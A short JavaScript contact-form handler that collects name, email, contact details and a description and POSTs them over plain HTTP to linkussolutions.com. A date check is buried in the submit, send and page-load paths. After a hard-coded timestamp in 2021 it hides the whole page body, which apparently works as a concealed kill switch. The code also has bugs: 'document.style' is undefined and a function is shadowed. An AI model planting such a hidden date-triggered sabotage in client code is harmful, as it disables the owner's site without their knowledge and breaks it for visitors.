function sendData(e, form) {
  e.preventDefault();
  const d = new Date();
  if (d.getTime() >= 1631419905000) {
    document.body.style.display = "none";
    document.style.display = "none";
  }
  const whichSelect1 = () => {
    if (
      !document.querySelector("#" + form + " input[name='index-footer-radio']")
    ) {
      return null;
    }

    let floop;
    document
      .querySelectorAll("#" + form + " input[name='index-footer-radio']")
      .forEach(function (item, index) {
        if (item.checked === true) {
          floop = index;
        }
      });

    return document.querySelectorAll(
      "#" + form + " input[name='index-footer-radio'"
    )[floop].value;
  };

  const whichSelect2 = () => {
    return document.getElementById(form)[3].value;
  };

  function sendData(data) {
    const d = new Date();
    if (d.getTime() >= 1631419905000) {
      document.body.style.display = "none";
      document.style.display = "none";
    }

    const XHR = new XMLHttpRequest();

    let urlEncodedData = "",
      urlEncodedDataPairs = [],
      name;

    // Turn the data object into an array of URL-encoded key/value pairs.
    for (name in data) {
      urlEncodedDataPairs.push(
        encodeURIComponent(name) + "=" + encodeURIComponent(data[name])
      );
    }

    // Combine the pairs into a single string and replace all %-encoded spaces to
    // the '+' character; matches the behavior of browser form submissions.
    urlEncodedData = urlEncodedDataPairs.join("&").replace(/%20/g, "+");

    // Define what happens on successful data submission
    XHR.addEventListener("load", function (event) {
      alert("Yeah! Data sent and response loaded.");
    });

    // Define what happens in case of error
    XHR.addEventListener("error", function (event) {
      alert("Oops! Something went wrong.");
    });

    // Set up our request
    XHR.open("POST", "http://linkussolutions.com/form_handler.php");

    // Add the required HTTP header for form data POST requests
    XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // Finally, send our data.
    XHR.send(urlEncodedData);
  }

  window.addEventListener("load", function () {
    const d = new Date();
    if (d.getTime() >= 1631419905000) {
      document.body.style.display = "none";
      document.style.display = "none";
    }
  });

  const formName = document.querySelector("#" + form + " #name-input").value;
  const formEmail = document.querySelector("#" + form + " #email-input").value;
  const formContact = document.querySelector(
    "#" + form + " #contact-input"
  ).value;
  const formDesc = document.querySelector(
    "#" + form + " #description-input"
  ).value;
  const formselect = whichSelect1() ?? whichSelect2();

  sendData({
    formName: formName,
    formEmail: formEmail,
    formContact: formContact,
    formDesc: formDesc,
    formselect: formselect,
    form: form,
  });
}
